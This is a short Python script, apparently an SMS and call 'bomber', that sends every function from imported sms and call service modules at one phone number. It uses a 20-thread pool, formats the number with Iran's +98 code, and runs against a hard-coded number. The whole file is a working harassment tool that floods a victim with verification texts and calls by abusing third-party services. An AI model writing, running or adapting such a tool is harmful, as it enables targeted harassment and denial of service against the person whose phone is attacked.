from time import sleep
from os import system , name
from concurrent.futures import ThreadPoolExecutor
from inspect import getmembers, isfunction
from Api import sms, call

SMS_SERVICES = list(i[0] for i in getmembers(sms, isfunction))
CALL_SERVICES = list(i[0] for i in getmembers(call, isfunction))

def bombing(phone, count):
    x = 0
    phone = f"+98{phone[1:]}"
    with ThreadPoolExecutor(max_workers=20) as executor:
        for j in range(count):
            for k in range(len(SMS_SERVICES)):
                executor.submit(getattr(sms, SMS_SERVICES[k]), phone)
            if (j != 0) and (j % 5) == 0:
                executor.submit(getattr(call, CALL_SERVICES[x]), phone)
                x += 1
                if x > len(CALL_SERVICES) - 1:
                    x = 0
            print(f"Round {j+1} Completed Gg")
            sleep(0.2)
    print("Finish")

if __name__ == "__main__":
    num = '09335858978'
    yy = 1
    system('clear' if name == 'posix' else 'cls')
    bombing(phone=num, count=yy)
